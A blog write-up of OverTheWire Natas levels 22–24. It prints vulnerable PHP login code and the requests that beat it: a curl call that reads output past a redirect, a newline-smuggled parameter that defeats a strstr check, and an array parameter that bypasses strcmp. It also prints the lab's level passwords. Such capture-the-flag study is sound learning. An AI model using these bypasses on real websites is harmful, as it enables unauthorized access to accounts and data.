+<p>Starting this off by going to: <a href="http://natas22.natas.labs.overthewire.org/">http://natas22.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas22
+Pass: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+</code></pre></td></tr></table>
+</div>
+</div><p>A blank page, with only a source button, taking a look at the source:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;revelio&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// only admins can reveal the password
+</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION and array_key_exists</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas22<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;revelio&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s2">&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;&lt;pre&gt;Username: natas23</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="k">print</span> <span class="s2">&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Not a lot going on here. However, seems it is still required to set <code>$_SESSION[&quot;admin&quot;] == 1</code> based on what the server wants to run when we try to load <code>index.php</code>. That said looking a bit further down the code <code>GET</code> request and <code>revelio</code> (which is a nod to Harry Potter, for <a href="https://harrypotter.fandom.com/wiki/Revelio_Charm" target="_blank" rel="noopener noreffer">reveal</a>]).</p>
+<p>In other words what&rsquo;s happening is the page is served up, the PHP script is then run, we aren&rsquo;t logged in so we get redirected to the previous page due to the <code>header()</code> function. Most modern browsers will filter out loading of the original page. However using something like curl should provide the original data, which allows us to see the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">$ curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ  http://natas22.natas.labs.overthewire.org/?revelio -v
+
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas22<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+
+You are an admin. The credentials for the next level are:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas23">natas23</h2>
+<p>Starting this off by going to: <a href="http://natas23.natas.labs.overthewire.org/">http://natas23.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas23
+Pass: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+</code></pre></td></tr></table>
+</div>
+</div><p>This challenge just present a &ldquo;Password:&rdquo; input box and a submit button. The trust &ldquo;View source&rdquo; button is still around which provides the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas23<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+Password:
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;input&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;get&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;passwd&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">20</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Login&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;passwd&#34;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;passwd&#34;</span><span class="p">],</span><span class="s2">&#34;iloveyou&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;passwd&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="p">)){</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&#34;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;Wrong!&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// morla / 10111
+</span><span class="c1"></span><span class="cp">?&gt;</span>  
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The trick here is just exploiting the following check:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if(strstr($_REQUEST[&#34;passwd&#34;],&#34;iloveyou&#34;) <span class="err">&amp;&amp;</span> ($_REQUEST[&#34;passwd&#34;] &gt; 10 ))
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.php.net/manual/en/function.strstr.php" target="_blank" rel="noopener noreffer">strstr</a> is the weak point, it just looks to match <strong>anywhere</strong> in the string that was provided, even across multiple lines. The other check is if the value in <code>passwd is &gt; 10</code>. Since there&rsquo;s no filtering, we can abuse the new line in order to make the input string look like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="m">11</span>
+iloveyou
+</code></pre></td></tr></table>
+</div>
+</div><p>Which gives the following url to exploit this challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas23.natas.labs.overthewire.org/?passwd=11%0Ailoveyou
+</code></pre></td></tr></table>
+</div>
+</div><p>And the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">The</span> <span class="n">credentials</span> <span class="n">for</span> <span class="n">the</span> <span class="n">next</span> <span class="n">level</span> <span class="n">are</span><span class="o">:</span>
+<span class="n">Username</span><span class="o">:</span> <span class="n">natas24</span> <span class="n">Password</span><span class="o">:</span> <span class="n">OsRmXFguozKpTZZ5X14zNO43379LZveg</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas24">natas24</h2>
+<p>Starting this off by going to: <a href="http://natas24.natas.labs.overthewire.org/">http://natas24.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas24
+Pass: OsRmXFguozKpTZZ5X14zNO43379LZveg
+</code></pre></td></tr></table>
+</div>
+</div><p>Another password login challenge. This time the code looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;passwd&#34;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;passwd&#34;</span><span class="p">],</span><span class="s2">&#34;&lt;censored&gt;&#34;</span><span class="p">)){</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&#34;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;Wrong!&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// morla / 10111
+</span><span class="c1"></span><span class="cp">?&gt;</span>  
+</code></pre></td></tr></table>
+</div>
+</div><p>This time around the <code>passwd</code> is hidden and there&rsquo;s a <a href="https://www.php.net/manual/en/function.strcmp.php" target="_blank" rel="noopener noreffer">strcmp</a> to exploit to beat this challenge.</p>
+<p>The trick here is to exploit the fact that there&rsquo;s no type checking on the data for password. It turns out that <code>strcmp</code> will return a 0 if there&rsquo;s an error when comparing. An error can be introduced by forcing the object (e.g.: an array) type to be something else, aka, <code>strcmp(object, string) = 0</code>. By getting <code>strcmp</code> to produce a value of <code>0</code>, the not operator (<code>!</code>) will then flip the <code>0</code> to a <code>1</code> allowing the check to succeed.</p>
+<p>Putting it together:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas24.natas.labs.overthewire.org/?passwd[]=%22%22
+
+Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+</code></pre></td></tr></table>
+</div>
+</div><p>The credentials for the next level are:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-21&nbsp;<i class="fas fa-hashtag fa-fw"></i>f3dad5f</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/natas_challenges_part4/" data-title="Natas Challenges (part 4)" data-hashtags="OTW,natas,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/natas_challenges_part4/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/natas/">natas</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/natas_challenges_part3/" class="prev" rel="prev" title="Natas Challenges (part 3)"><i class="fas fa-angle-left fa-fw"></i>Natas Challenges (part 3)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
